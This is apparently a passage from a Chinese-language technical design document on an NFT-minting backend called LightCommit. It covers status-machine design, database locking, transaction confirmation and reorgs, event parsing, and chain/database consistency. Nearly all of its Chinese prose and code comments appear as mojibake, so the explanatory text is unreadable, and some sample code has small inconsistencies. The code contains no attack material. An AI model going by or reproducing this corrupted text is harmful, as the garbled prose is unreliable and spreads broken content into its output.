
// è¿›ç¨‹ Bï¼šé“¸é€ æµç¨‹ï¼Œæ›´æ–° status
await ContributionRepository.update(contributionId, {
  status: ContributionStatus.MINTING,
  transactionHash: '0x...',
});

// é—®é¢˜ï¼šå¦‚æœä¸¤è€…åŒæ—¶æ‰§è¡Œï¼Œå¯èƒ½äº’ç›¸è¦†ç›–

// è§£å†³æ–¹æ¡ˆ Aï¼šä¹è§‚é”ï¼ˆOptimistic Lockingï¼‰
// åœ¨è¡¨ä¸­æ·»åŠ  version å­—æ®µ
ALTER TABLE contributions ADD COLUMN version INTEGER DEFAULT 1;

// æ›´æ–°æ—¶æ£€æŸ¥ç‰ˆæœ¬å·
async function updateWithVersion(id: string, data: any, expectedVersion: number) {
  const result = await supabase
    .from('contributions')
    .update({
      ...data,
      version: expectedVersion + 1,  // ç‰ˆæœ¬å·é€’å¢
    })
    .eq('id', id)
    .eq('version', expectedVersion)  // â† å…³é”®ï¼šåªæœ‰ç‰ˆæœ¬åŒ¹é…æ‰æ›´æ–°
    .select()
    .single();
  
  if (!result.data) {
    // ç‰ˆæœ¬ä¸åŒ¹é…ï¼Œè¯´æ˜æ•°æ®å·²è¢«å…¶ä»–è¿›ç¨‹ä¿®æ”¹
    throw new Error('Concurrent update detected, please retry');
  }
  
  return result.data;
}

// ä½¿ç”¨ï¼š
try {
  await updateWithVersion(contributionId, { status: 'minting' }, currentVersion);
} catch (error) {
  // é‡æ–°è·å–æœ€æ–°æ•°æ®ï¼Œé‡è¯•
  const latest = await ContributionRepository.findById(contributionId);
  await updateWithVersion(contributionId, { status: 'minting' }, latest.version);
}

// è§£å†³æ–¹æ¡ˆ Bï¼šæ•°æ®åº“è¡Œé”ï¼ˆPessimistic Lockingï¼‰
await supabase.rpc('update_contribution_with_lock', {
  contribution_id: contributionId,
  new_status: 'minting',
});

// PostgreSQL å‡½æ•°ï¼ˆä½¿ç”¨ SELECT FOR UPDATEï¼‰
CREATE OR REPLACE FUNCTION update_contribution_with_lock(
  contribution_id UUID,
  new_status contribution_status
) RETURNS void AS $$
BEGIN
  -- é”å®šè¿™ä¸€è¡Œï¼Œå…¶ä»–äº‹åŠ¡å¿…é¡»ç­‰å¾…
  SELECT * FROM contributions WHERE id = contribution_id FOR UPDATE;
  
  -- æ›´æ–°
  UPDATE contributions 
  SET status = new_status, "updatedAt" = NOW()
  WHERE id = contribution_id;
END;
$$ LANGUAGE plpgsql;
```

**æŒ‘æˆ˜ 4ï¼šç¼ºå°‘ä¸­é—´çŠ¶æ€**

```typescript
// å½“å‰çŠ¶æ€å¤ªå°‘ï¼Œæ— æ³•ç²¾ç¡®è¡¨è¾¾æµç¨‹

// å®é™…éœ€è¦çš„çŠ¶æ€ï¼š
export enum ContributionStatus {
  PENDING = 'pending',              // å·²å…¥åº“ï¼Œå¾…è¯„åˆ†
  SCORING = 'scoring',              // è¯„åˆ†ä¸­ï¼ˆAI è®¡ç®—ï¼‰
  SCORED = 'scored',                // å·²è¯„åˆ†ï¼Œå¾…ä¸Šé“¾
  SIGNING = 'signing',              // ç­¾åä¸­ï¼ˆEIP-712ï¼‰
  SIGNED = 'signed',                // å·²ç­¾åï¼Œå¾…æäº¤
  SUBMITTING_FEEDBACK = 'submitting_feedback',  // æäº¤è¯„åˆ†åˆ° ReputationRegistry
  FEEDBACK_SUBMITTED = 'feedback_submitted',    // è¯„åˆ†å·²ä¸Šé“¾
  REQUESTING_VALIDATION = 'requesting_validation',  // è¯·æ±‚éªŒè¯
  VALIDATION_REQUESTED = 'validation_requested',    // éªŒè¯è¯·æ±‚å·²ä¸Šé“¾
  MINTING = 'minting',              // é“¸é€ ä¸­ï¼ˆValidationRegistry è§¦å‘ï¼‰
  MINTED = 'minted',                // å·²é“¸é€ 
  FAILED = 'failed',                // ä»»ä¸€ç¯èŠ‚å¤±è´¥
}

// æ¯ä¸ªçŠ¶æ€è½¬æ¢éƒ½æœ‰æ˜ç¡®çš„è§¦å‘æ¡ä»¶ï¼š
const transitions = {
  'pending -> scoring': 'è°ƒç”¨è¯„åˆ†æœåŠ¡',
  'scoring -> scored': 'è¯„åˆ†å®Œæˆ',
  'scored -> signing': 'ç”Ÿæˆç­¾åæ•°æ®',
  'signing -> signed': 'ç­¾åå®Œæˆ',
  'signed -> submitting_feedback': 'è°ƒç”¨ submitFeedback',
  'submitting_feedback -> feedback_submitted': 'äº¤æ˜“ç¡®è®¤',
  'feedback_submitted -> requesting_validation': 'è°ƒç”¨ requestValidation',
  'requesting_validation -> validation_requested': 'äº¤æ˜“ç¡®è®¤',
  'validation_requested -> minting': 'ValidationRegistry è§¦å‘é“¸é€ ',
  'minting -> minted': 'CommitMinted äº‹ä»¶',
  '* -> failed': 'ä»»ä¸€ç¯èŠ‚å¼‚å¸¸',
};

// è¿™æ ·å¯ä»¥ç²¾ç¡®å®šä½é—®é¢˜å‡ºåœ¨å“ªä¸ªç¯èŠ‚
```

**æŒ‘æˆ˜ 5ï¼šçŠ¶æ€å›é€€ä¸é‡è¯•**

```typescript
// åœºæ™¯ï¼šé“¸é€ å¤±è´¥åï¼Œç”¨æˆ·æƒ³é‡è¯•

// å½“å‰é—®é¢˜ï¼š
// 1. çŠ¶æ€å˜ä¸º 'failed' åï¼Œæ— æ³•é‡è¯•
// 2. åˆçº¦ä¸­ commit å·²è¢«æ ‡è®°ä¸º mintedï¼ˆé˜²é‡å¤é“¸é€ ï¼‰
// 3. å³ä½¿æ¸…ç©ºçŠ¶æ€ï¼Œåˆçº¦ä»ç„¶æ‹’ç»

// ç¤ºä¾‹ï¼š
const contribution = await ContributionRepository.findById(id);
if (contribution.status === ContributionStatus.FAILED) {
  // ç”¨æˆ·ç‚¹å‡»"é‡è¯•"
  
  // âŒ ç›´æ¥é‡è¯•ä¼šå¤±è´¥
  await mintContribution(id);  // åˆçº¦ï¼šCommit already minted
}

// è§£å†³æ–¹æ¡ˆ Aï¼šåˆçº¦å±‚æ”¯æŒé‡ç½®
// åœ¨ CommitNFT ä¸­æ·»åŠ ç®¡ç†å‘˜æ–¹æ³•
function resetMintedCommit(string memory commitHash) external onlyOwner {
  require(_mintedCommits[commitHash], "Commit not minted");
  _mintedCommits[commitHash] = false;  // é‡ç½®æ ‡è®°
  emit CommitReset(commitHash, block.timestamp);
}

// åç«¯è°ƒç”¨ï¼š
async function retryMint(contributionId: string) {
  const contribution = await ContributionRepository.findById(contributionId);
  
  if (contribution.status === ContributionStatus.FAILED) {
    // 1. é‡ç½®åˆçº¦æ ‡è®°
    const commitHash = contribution.metadata.sha;
    await contract.resetMintedCommit(commitHash);
    
    // 2. é‡ç½®æ•°æ®åº“çŠ¶æ€
    await ContributionRepository.update(contributionId, {
      status: ContributionStatus.PENDING,
      transactionHash: null,
      tokenId: null,
    });
    
    // 3. é‡æ–°é“¸é€ 
    await mintContribution(contributionId);
  }
}

// è§£å†³æ–¹æ¡ˆ Bï¼šå…è®¸ç”¨æˆ·ä¸»åŠ¨æ ‡è®°ä¸ºå¤±è´¥
// å‰ç«¯ï¼š
<button onClick={async () => {
  // ç”¨æˆ·ç¡®è®¤è¿™ä¸ªäº¤æ˜“ç¡®å®å¤±è´¥äº†
  await fetch(`/api/contributions/${id}/mark-failed`, { method: 'POST' });
  // åç«¯ä¼šæ£€æŸ¥é“¾ä¸ŠçŠ¶æ€ï¼Œå¦‚æœç¡®å®å¤±è´¥ï¼Œæ›´æ–°æ•°æ®åº“
}}>
  æ ‡è®°ä¸ºå¤±è´¥
</button>

// åç«¯ï¼š
export async function POST(request: NextRequest, { params }) {
  const { id } = await params;
  const contribution = await ContributionRepository.findById(id);
  
  if (!contribution.transactionHash) {
    return NextResponse.json({ error: 'No transaction hash' }, { status: 400 });
  }
  
  // æ£€æŸ¥é“¾ä¸ŠçŠ¶æ€
  const provider = new ethers.JsonRpcProvider(process.env.SEPOLIA_RPC_URL);
  const receipt = await provider.getTransactionReceipt(contribution.transactionHash);
  
  if (receipt && receipt.status === 0) {
    // ç¡®å®å¤±è´¥äº†ï¼Œæ›´æ–°çŠ¶æ€
    await ContributionRepository.update(id, {
      status: ContributionStatus.FAILED,
    });
    return NextResponse.json({ success: true });
  }
  
  return NextResponse.json({ error: 'Transaction not failed' }, { status: 400 });
}
```

---

### 2.2 äº¤æ˜“ç¡®è®¤ä¸çŠ¶æ€æ›´æ–°é—®é¢˜

#### é—®é¢˜æè¿°

åŒºå—é“¾äº¤æ˜“æœ‰å¤šä¸ªé˜¶æ®µï¼Œæ¯ä¸ªé˜¶æ®µéƒ½éœ€è¦æ­£ç¡®å¤„ç†å¹¶åŒæ­¥åˆ°æ•°æ®åº“ã€‚

#### äº¤æ˜“ç”Ÿå‘½å‘¨æœŸ

```typescript
// äº¤æ˜“çš„ 5 ä¸ªé˜¶æ®µï¼š

// é˜¶æ®µ 1ï¼šæ„é€ äº¤æ˜“
const tx = await contract.mintCommit(to, commitData, metadataUri);
// - tx.hash å­˜åœ¨ï¼Œä½†äº¤æ˜“è¿˜æœªå‘é€åˆ°ç½‘ç»œ
// - æ­¤æ—¶ transactionHash å¯ä»¥è®°å½•åˆ°æ•°æ®åº“

// é˜¶æ®µ 2ï¼šäº¤æ˜“å‘é€ï¼ˆSentï¼‰
// - äº¤æ˜“å·²å‘é€åˆ° RPC èŠ‚ç‚¹
// - RPC èŠ‚ç‚¹è¿”å› tx.hash
// - äº¤æ˜“åœ¨æœ¬åœ°å†…å­˜æ± ï¼ˆmempoolï¼‰ä¸­

// é˜¶æ®µ 3ï¼šäº¤æ˜“æ‰“åŒ…ï¼ˆPendingï¼‰
// - çŸ¿å·¥/éªŒè¯è€…é€‰æ‹©äº¤æ˜“æ‰“åŒ…è¿›åŒºå—
// - æ ¹æ® Gas ä»·æ ¼ä¼˜å…ˆçº§æ’åº
// - å¯èƒ½ç­‰å¾…æ•°ç§’åˆ°æ•°åˆ†é’Ÿ

// é˜¶æ®µ 4ï¼šäº¤æ˜“ç¡®è®¤ï¼ˆConfirmedï¼‰
const receipt = await tx.wait();  // â† é˜»å¡ï¼Œç›´åˆ°äº¤æ˜“è¢«æ‰“åŒ…
// - receipt.status: 1 = æˆåŠŸ, 0 = å¤±è´¥ï¼ˆrevertï¼‰
// - receipt.blockNumber: åŒºå—å·
// - receipt.logs: äº‹ä»¶æ—¥å¿—

// é˜¶æ®µ 5ï¼šæœ€ç»ˆç¡®è®¤ï¼ˆFinalizedï¼‰
const receipt = await tx.wait(6);  // ç­‰å¾… 6 ä¸ªç¡®è®¤ï¼ˆçº¦ 1 åˆ†é’Ÿï¼‰
// - æ›´å®‰å…¨ï¼Œé˜²æ­¢åŒºå—é‡ç»„
// - äº¤æ˜“æ‰€é€šå¸¸è¦æ±‚ 12-20 ä¸ªç¡®è®¤
```

#### å…·ä½“æŒ‘æˆ˜

**æŒ‘æˆ˜ 1ï¼štx.wait() å¯èƒ½æ°¸è¿œä¸è¿”å›**

```typescript
// é—®é¢˜ï¼šå¦‚æœäº¤æ˜“ä¸€ç›´ pendingï¼Œtx.wait() ä¼šä¸€ç›´é˜»å¡

async function mintWithTimeout(contributionId: string) {
  const tx = await contract.mintCommit(to, commitData, metadataUri);
  
  // ç«‹å³è®°å½• hash
  await ContributionRepository.update(contributionId, {
    status: ContributionStatus.MINTING,
    transactionHash: tx.hash,
  });
  
  // âŒ é—®é¢˜ï¼šå¦‚æœ Gas ä»·æ ¼å¤ªä½ï¼Œäº¤æ˜“å¯èƒ½æ°¸è¿œä¸è¢«æ‰“åŒ…
  const receipt = await tx.wait();  // â† å¯èƒ½æ°¸è¿œé˜»å¡
  
  // è§£å†³æ–¹æ¡ˆï¼šè®¾ç½®è¶…æ—¶
  const receiptPromise = tx.wait();
  const timeoutPromise = new Promise((_, reject) => 
    setTimeout(() => reject(new Error('Transaction timeout')), 5 * 60 * 1000)  // 5 åˆ†é’Ÿè¶…æ—¶
  );
  
  try {
    const receipt = await Promise.race([receiptPromise, timeoutPromise]);
    
    // äº¤æ˜“ç¡®è®¤
    await ContributionRepository.update(contributionId, {
      status: ContributionStatus.MINTED,
      tokenId: parseTokenId(receipt),
    });
    
  } catch (error) {
    if (error.message === 'Transaction timeout') {
      // è¶…æ—¶ï¼Œä½†äº¤æ˜“å¯èƒ½ä»åœ¨ pending
      console.warn(`äº¤æ˜“ ${tx.hash} è¶…æ—¶ï¼Œä½†å¯èƒ½ä»åœ¨ç¡®è®¤ä¸­`);
      
      // ä¸ä¿®æ”¹çŠ¶æ€ï¼Œè®©å®šæ—¶ä»»åŠ¡å»æ£€æŸ¥
      // æˆ–è€…æç¤ºç”¨æˆ·æ‰‹åŠ¨æ£€æŸ¥
      return {
        status: 'pending',
        message: 'äº¤æ˜“ç¡®è®¤ä¸­ï¼Œè¯·ç¨åæŸ¥çœ‹',
        transactionHash: tx.hash,
      };
    }
    
    throw error;
  }
}
```

**æŒ‘æˆ˜ 2ï¼šåŒºå—é‡ç»„ï¼ˆReorgï¼‰é—®é¢˜**

```typescript
// åŒºå—é‡ç»„ï¼šå·²ç¡®è®¤çš„äº¤æ˜“å¯èƒ½è¢«å›æ»š

// åœºæ™¯ï¼š
// 1. äº¤æ˜“åœ¨åŒºå— #100 ä¸­è¢«ç¡®è®¤
// 2. æ•°æ®åº“æ›´æ–°ä¸º 'minted'
// 3. å‘ç”ŸåŒºå—é‡ç»„ï¼ŒåŒºå— #100 è¢«åºŸå¼ƒ
// 4. äº¤æ˜“å›åˆ° pending çŠ¶æ€ï¼ˆæˆ–æ¶ˆå¤±ï¼‰
// 5. æ•°æ®åº“ä»æ˜¾ç¤º 'minted'ï¼ˆä¸ä¸€è‡´ï¼ï¼‰

// é˜²æŠ¤æªæ–½ï¼šç­‰å¾…å¤šä¸ªç¡®è®¤
const receipt = await tx.wait(6);  // ç­‰å¾… 6 ä¸ªç¡®è®¤ï¼ˆçº¦ 1 åˆ†é’Ÿï¼‰

// ä¸åŒç½‘ç»œçš„å»ºè®®ç¡®è®¤æ•°ï¼š
const confirmations = {
  mainnet: 12,      // ä»¥å¤ªåŠä¸»ç½‘ï¼š12 ä¸ªç¡®è®¤ï¼ˆçº¦ 2.5 åˆ†é’Ÿï¼‰
  sepolia: 6,       // Sepolia æµ‹è¯•ç½‘ï¼š6 ä¸ªç¡®è®¤
  hardhat: 1,       // æœ¬åœ°ç½‘ç»œï¼š1 ä¸ªç¡®è®¤å³å¯
  optimism: 20,     // Optimism L2ï¼šéœ€è¦ç­‰å¾… L1 ç¡®è®¤
};

const chainId = await provider.getNetwork().then(n => n.chainId);
const requiredConfirmations = confirmations[chainId] || 6;

const receipt = await tx.wait(requiredConfirmations);

// æ›´æ–°æ•°æ®åº“ï¼ˆæ­¤æ—¶æ›´å®‰å…¨ï¼‰
await ContributionRepository.update(contributionId, {
  status: ContributionStatus.MINTED,
  tokenId: parseTokenId(receipt),
});
```

**æŒ‘æˆ˜ 3ï¼šäº‹ä»¶è§£æçš„å¯é æ€§**

```typescript
// å½“å‰ä»£ç ï¼šä» receipt.logs è§£æ tokenId
const receipt = await tx.wait();

// æ–¹æ³• Aï¼šéå† logs æŸ¥æ‰¾ CommitMinted äº‹ä»¶
let tokenId: string | undefined;
const event = receipt.logs.find((log: any) => {
  try {
    const parsed = contract.interface.parseLog(log);
    return parsed?.name === 'CommitMinted';  // â† å¯èƒ½è§£æå¤±è´¥
  } catch {
    return false;
  }
});

if (event) {
  const parsed = contract.interface.parseLog(event);
  tokenId = parsed?.args?.tokenId?.toString();
}

// é—®é¢˜ï¼š
// 1. å¦‚æœåˆçº¦æ²¡æœ‰ emit CommitMintedï¼ˆè™½ç„¶ä¸å¤ªå¯èƒ½ï¼‰
// 2. å¦‚æœ ABI ä¸åŒ¹é…ï¼ˆåˆçº¦å‡çº§å ABI æœªæ›´æ–°ï¼‰
// 3. å¦‚æœ log è¢«å…¶ä»–åˆçº¦ emitï¼ˆåœ°å€è¿‡æ»¤å¤±è´¥ï¼‰

// æ”¹è¿›æ–¹æ¡ˆï¼šå¤šé‡éªŒè¯
async function parseTokenIdSafely(receipt: any, contractAddress: string): Promise<string | null> {
  // æ–¹æ³• 1ï¼šä»äº‹ä»¶è§£æ
  try {
    const event = receipt.logs.find((log: any) => {
      // è¿‡æ»¤åœ°å€ï¼ˆç¡®ä¿æ˜¯æˆ‘ä»¬çš„åˆçº¦ emit çš„ï¼‰
      if (log.address.toLowerCase() !== contractAddress.toLowerCase()) {
        return false;
      }
      
      try {
        const parsed = contract.interface.parseLog(log);
        return parsed?.name === 'CommitMinted';
      } catch {
        return false;
      }
    });
    
    if (event) {
      const parsed = contract.interface.parseLog(event);
      return parsed?.args?.tokenId?.toString() || null;
    }
  } catch (error) {
    console.error('è§£æäº‹ä»¶å¤±è´¥:', error);
  }
  
  // æ–¹æ³• 2ï¼šç›´æ¥æŸ¥è¯¢åˆçº¦ï¼ˆfallbackï¼‰
  try {
    // è·å–å½“å‰ tokenIdï¼ˆå‡è®¾æ˜¯è‡ªå¢çš„ï¼‰
    const currentTokenId = await contract.getCurrentTokenId();
    
    // æŸ¥è¯¢æœ€æ–°é“¸é€ çš„ NFT æ‰€æœ‰è€…
    const owner = await contract.ownerOf(currentTokenId - 1);
    
    // éªŒè¯æ˜¯å¦æ˜¯æˆ‘ä»¬åˆšé“¸é€ çš„
    if (owner.toLowerCase() === to.toLowerCase()) {
      return (currentTokenId - 1).toString();
    }
  } catch (error) {
    console.error('æŸ¥è¯¢åˆçº¦å¤±è´¥:', error);
  }
  
  // æ–¹æ³• 3ï¼šé€šè¿‡ commit hash åæŸ¥
  try {
    const commitHash = commitData.commit;
    const tokenId = await contract.getTokenIdByCommit(commitHash);
    if (tokenId > 0) {
      return tokenId.toString();
    }
  } catch (error) {
    console.error('åæŸ¥ tokenId å¤±è´¥:', error);
  }
  
  // æ‰€æœ‰æ–¹æ³•éƒ½å¤±è´¥ï¼Œè¿”å› null
  console.warn('æ— æ³•è§£æ tokenIdï¼Œéœ€è¦æ‰‹åŠ¨æ£€æŸ¥äº¤æ˜“:', receipt.hash);
  return null;
}

// ä½¿ç”¨ï¼š
const receipt = await tx.wait();
const tokenId = await parseTokenIdSafely(receipt, contractAddress);

if (tokenId) {
  await ContributionRepository.update(contributionId, {
    status: ContributionStatus.MINTED,
    tokenId,
  });
} else {
  // é“¸é€ å¯èƒ½æˆåŠŸï¼Œä½†æ— æ³•ç¡®å®š tokenId
  await ContributionRepository.update(contributionId, {
    status: ContributionStatus.MINTED,  // çŠ¶æ€æ ‡è®°ä¸ºæˆåŠŸ
    tokenId: null,                      // tokenId å¾…è¡¥å…¨
    metadata: {
      ...contribution.metadata,
      needsTokenIdUpdate: true,         // æ ‡è®°éœ€è¦åç»­æ›´æ–°
    },
  });
}
```

---

### 2.3 æ•°æ®ä¸€è‡´æ€§ä¿è¯é—®é¢˜

#### é—®é¢˜æè¿°

é“¾ä¸Šå’Œé“¾ä¸‹æ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„ç³»ç»Ÿï¼Œå¦‚ä½•ä¿è¯æ•°æ®æœ€ç»ˆä¸€è‡´ï¼Ÿ

#### å…·ä½“æŒ‘æˆ˜

**æŒ‘æˆ˜ 1ï¼šé“¾ä¸ŠæˆåŠŸä½†æ•°æ®åº“æ›´æ–°å¤±è´¥**

```typescript
// æœ€å±é™©çš„åœºæ™¯ï¼š
async function mintContribution(contributionId: string) {
  // 1. å‘é€äº¤æ˜“
  const tx = await contract.mintCommit(to, commitData, metadataUri);
  
  // 2. æ›´æ–°çŠ¶æ€ä¸º minting
  await ContributionRepository.update(contributionId, {
    status: ContributionStatus.MINTING,
    transactionHash: tx.hash,
  });
  
  // 3. ç­‰å¾…ç¡®è®¤
  const receipt = await tx.wait();
  
  // 4. äº¤æ˜“æˆåŠŸï¼ˆé“¾ä¸Šå·²é“¸é€  NFTï¼‰
  console.log('âœ… NFT é“¸é€ æˆåŠŸï¼ŒTokenID:', tokenId);
  
  // âš ï¸ æ­¤æ—¶æ•°æ®åº“æ›´æ–°å¤±è´¥ï¼ˆç½‘ç»œæ–­å¼€ã€æ•°æ®åº“å®•æœºç­‰ï¼‰
  await ContributionRepository.update(contributionId, {
    status: ContributionStatus.MINTED,  // â† æŠ›å‡ºå¼‚å¸¸ï¼Œæœªæ‰§è¡Œ
    tokenId,
  });
  
  // ç»“æœï¼š
  // - é“¾ä¸Šï¼šNFT å·²é“¸é€  âœ…
  // - æ•°æ®åº“ï¼šçŠ¶æ€ä»æ˜¯ 'minting' âŒ
  // - ç”¨æˆ·å›°æƒ‘ï¼šçœ‹ä¸åˆ°è‡ªå·±çš„ NFT
}

// è§£å†³æ–¹æ¡ˆ Aï¼šäº‹ä»¶é©±åŠ¨æ›´æ–°
// 1. ç›‘å¬åˆçº¦äº‹ä»¶ï¼ˆè€Œéç­‰å¾… tx.waitï¼‰
contract.on('CommitMinted', async (tokenId, to, repo, commit, ...) => {
  console.log('ç›‘å¬åˆ° CommitMinted äº‹ä»¶:', { tokenId, commit });
  
  // æ ¹æ® commit hash æŸ¥æ‰¾å¯¹åº”çš„è´¡çŒ®
  const contribution = await ContributionRepository.findByGithubId(commit);
  
  if (contribution) {
    // æ›´æ–°æ•°æ®åº“
    await ContributionRepository.update(contribution.id, {
      status: ContributionStatus.MINTED,
      tokenId: tokenId.toString(),
    });
  }
});

// ä¼˜ç‚¹ï¼šå³ä½¿äº¤æ˜“å‘é€åæœåŠ¡é‡å¯ï¼Œäº‹ä»¶ç›‘å¬ä¼šè¡¥ä¸Š
// ç¼ºç‚¹ï¼šéœ€è¦æŒç»­è¿è¡Œçš„ç›‘å¬è¿›ç¨‹

// è§£å†³æ–¹æ¡ˆ Bï¼šå®šæ—¶åŒæ­¥ä»»åŠ¡
async function syncBlockchainState() {
  // 1. æŸ¥è¯¢æ‰€æœ‰ 'minting' çŠ¶æ€çš„è´¡çŒ®
  const minting = await ContributionRepository.findAll({
    status: ContributionStatus.MINTING,
  });
  
  // 2. é€ä¸ªæ£€æŸ¥é“¾ä¸ŠçŠ¶æ€
  for (const contribution of minting) {
    const receipt = await provider.getTransactionReceipt(contribution.transactionHash);
    
    if (receipt) {
      if (receipt.status === 1) {
        // æˆåŠŸï¼Œæ›´æ–°æ•°æ®åº“
        const tokenId = parseTokenId(receipt);
        await ContributionRepository.update(contribution.id, {
          status: ContributionStatus.MINTED,
          tokenId,
        });
      } else {
        // å¤±è´¥ï¼Œæ›´æ–°æ•°æ®åº“
        await ContributionRepository.update(contribution.id, {
          status: ContributionStatus.FAILED,
        });
      }
    }
  }
}

// æ¯ 5 åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡
setInterval(syncBlockchainState, 5 * 60 * 1000);
```

**æŒ‘æˆ˜ 2ï¼šæ•°æ®åº“æˆåŠŸä½†é“¾ä¸Šå¤±è´¥**

```typescript
// åœºæ™¯ï¼šå…ˆæ›´æ–°æ•°æ®åº“ï¼Œå†å‘é€äº¤æ˜“

async function mintContributionWrong(contributionId: string) {
  // âŒ é”™è¯¯åšæ³•ï¼šå…ˆæ›´æ–°æ•°æ®åº“
  await ContributionRepository.update(contributionId, {
    status: ContributionStatus.MINTED,  // â† è¿‡æ—©æ ‡è®°ä¸ºæˆåŠŸ
  });
  
  // ç„¶åå‘é€äº¤æ˜“ï¼ˆå¯èƒ½å¤±è´¥ï¼‰
  const tx = await contract.mintCommit(to, commitData, metadataUri);
  await tx.wait();
  
  // å¦‚æœäº¤æ˜“å¤±è´¥ï¼š
  // - æ•°æ®åº“ï¼šminted âŒï¼ˆé”™è¯¯ï¼‰
  // - é“¾ä¸Šï¼šæœªé“¸é€  âœ…ï¼ˆæ­£ç¡®ï¼‰
}

// âœ… æ­£ç¡®åšæ³•ï¼šå…ˆé“¾ä¸Šï¼Œå†æ•°æ®åº“
async function mintContributionCorrect(contributionId: string) {
  let txHash: string | null = null;
  
  try {
    // 1. å‘é€äº¤æ˜“
    const tx = await contract.mintCommit(to, commitData, metadataUri);
    txHash = tx.hash;
    
    // 2. ç«‹å³è®°å½• hashï¼ˆå³ä½¿åç»­å¤±è´¥ï¼‰
    await ContributionRepository.update(contributionId, {
      status: ContributionStatus.MINTING,
      transactionHash: txHash,
    });
    
    // 3. ç­‰å¾…ç¡®è®¤
    const receipt = await tx.wait();
    
    // 4. æ ¹æ®ç»“æœæ›´æ–°
    if (receipt.status === 1) {
      await ContributionRepository.update(contributionId, {
        status: ContributionStatus.MINTED,
        tokenId: parseTokenId(receipt),
      });
    } else {
      await ContributionRepository.update(contributionId, {
        status: ContributionStatus.FAILED,
      });
    }
    
  } catch (error) {
    // 5. å¼‚å¸¸å¤„ç†
    if (txHash) {
      // äº¤æ˜“å·²å‘é€ï¼ŒçŠ¶æ€ä¸å˜ï¼ˆè®©å®šæ—¶ä»»åŠ¡æ£€æŸ¥ï¼‰
      console.warn('äº¤æ˜“å·²å‘é€ï¼Œä½†ç¡®è®¤å¤±è´¥:', txHash);
    } else {
      // äº¤æ˜“æœªå‘é€ï¼Œæ ‡è®°ä¸º failed
      await ContributionRepository.update(contributionId, {
        status: ContributionStatus.FAILED,
      });
    }
  }
}
```

**æŒ‘æˆ˜ 3ï¼šå‰ç«¯ä¹è§‚æ›´æ–°çš„å›æ»š**

```typescript
// React Query çš„ä¹è§‚æ›´æ–°ï¼ˆOptimistic Updateï¼‰

import { useMutation, useQueryClient } from '@tanstack/react-query';

function useMintContribution() {
  const queryClient = useQueryClient();
  
  return useMutation({
    mutationFn: async (contributionId: string) => {
      // è°ƒç”¨åç«¯é“¸é€  API
      const response = await fetch(`/api/contributions/${contributionId}/mint`, {
        method: 'POST',
      });
      return response.json();
    },
    
    // ä¹è§‚æ›´æ–°ï¼šç«‹å³æ›´æ–° UIï¼Œä¸ç­‰åç«¯è¿”å›
    onMutate: async (contributionId) => {
      // 1. å–æ¶ˆæ­£åœ¨è¿›è¡Œçš„æŸ¥è¯¢ï¼ˆé¿å…å†²çªï¼‰
      await queryClient.cancelQueries({ queryKey: ['contribution', contributionId] });
      
      // 2. ä¿å­˜å½“å‰æ•°æ®ï¼ˆç”¨äºå›æ»šï¼‰
      const previousData = queryClient.getQueryData(['contribution', contributionId]);
      
      // 3. ä¹è§‚æ›´æ–°ï¼šç«‹å³ä¿®æ”¹ä¸º 'minting'
      queryClient.setQueryData(['contribution', contributionId], (old: any) => ({
        ...old,
        status: ContributionStatus.MINTING,
      }));
      
      // è¿”å› contextï¼ˆç”¨äºå›æ»šï¼‰
      return { previousData };
    },
    
    // æˆåŠŸï¼šæ›´æ–°ä¸ºæœ€ç»ˆçŠ¶æ€
    onSuccess: (data, contributionId) => {
      queryClient.setQueryData(['contribution', contributionId], (old: any) => ({
        ...old,
        status: ContributionStatus.MINTED,
        tokenId: data.tokenId,
        transactionHash: data.transactionHash,
      }));
    },
    
    // å¤±è´¥ï¼šå›æ»šåˆ°ä¹‹å‰çš„çŠ¶æ€
    onError: (error, contributionId, context) => {
      // å›æ»š
      if (context?.previousData) {
        queryClient.setQueryData(['contribution', contributionId], context.previousData);
      }
      
      toast.error('é“¸é€ å¤±è´¥ï¼Œè¯·é‡è¯•');
    },
    
    // æ— è®ºæˆåŠŸå¤±è´¥ï¼Œéƒ½åˆ·æ–°æ•°æ®
    onSettled: (data, error, contributionId) => {
      queryClient.invalidateQueries({ queryKey: ['contribution', contributionId] });
    },
  });
}

// ä½¿ç”¨ï¼š
function MintButton({ contributionId }) {
  const { mutate, isPending } = useMintContribution();
  
  return (
    <button 
      onClick={() => mutate(contributionId)}
      disabled={isPending}
    >
      {isPending ? 'é“¸é€ ä¸­...' : 'é“¸é€  NFT'}
    </button>
  );
}
```

**æŒ‘æˆ˜ 4ï¼šæœ€ç»ˆä¸€è‡´æ€§ç­–ç•¥**

```typescript
// CAP å®šç†ï¼šä¸€è‡´æ€§(Consistency)ã€å¯ç”¨æ€§(Availability)ã€åˆ†åŒºå®¹é”™æ€§(Partition Tolerance)
// åªèƒ½åŒæ—¶æ»¡è¶³ä¸¤ä¸ª

// LightCommit çš„é€‰æ‹©ï¼šAPï¼ˆå¯ç”¨æ€§ + åˆ†åŒºå®¹é”™æ€§ï¼‰
// - å…è®¸çŸ­æš‚çš„æ•°æ®ä¸ä¸€è‡´
// - é€šè¿‡åå°ä»»åŠ¡æœ€ç»ˆåŒæ­¥

// å®ç°ï¼šæœ€ç»ˆä¸€è‡´æ€§æ¡†æ¶
class EventualConsistencyManager {
  // å®šæœŸæ£€æŸ¥ä¸ä¸€è‡´çš„è®°å½•
  async checkInconsistencies() {
    // 1. æ£€æŸ¥é“¾ä¸Šå·²é“¸é€ ï¼Œä½†æ•°æ®åº“æœªæ›´æ–°çš„
    await this.syncMintedNFTs();
    
    // 2. æ£€æŸ¥æ•°æ®åº“æ ‡è®°ä¸º mintedï¼Œä½†é“¾ä¸Šä¸å­˜åœ¨çš„
    await this.validateMintedStatus();
    
    // 3. æ£€æŸ¥é•¿æ—¶é—´ pending çš„äº¤æ˜“
    await this.cleanupStaleTransactions();
  }
  
  // åŒæ­¥å·²é“¸é€ çš„ NFT
  async syncMintedNFTs() {
    const contract = new ethers.Contract(address, abi, provider);
    
    // ç›‘å¬å†å²äº‹ä»¶ï¼ˆä»ä¸Šæ¬¡åŒæ­¥ç‚¹å¼€å§‹ï¼‰
    const lastSyncBlock = await this.getLastSyncBlock();
    const currentBlock = await provider.getBlockNumber();
    
    // åˆ†æ‰¹æŸ¥è¯¢ï¼ˆé¿å… RPC é™åˆ¶ï¼‰
    const batchSize = 5000;
    for (let from = lastSyncBlock; from < currentBlock; from += batchSize) {
      const to = Math.min(from + batchSize, currentBlock);
      
      const events = await contract.queryFilter(
        contract.filters.CommitMinted(),
        from,
        to
      );
      
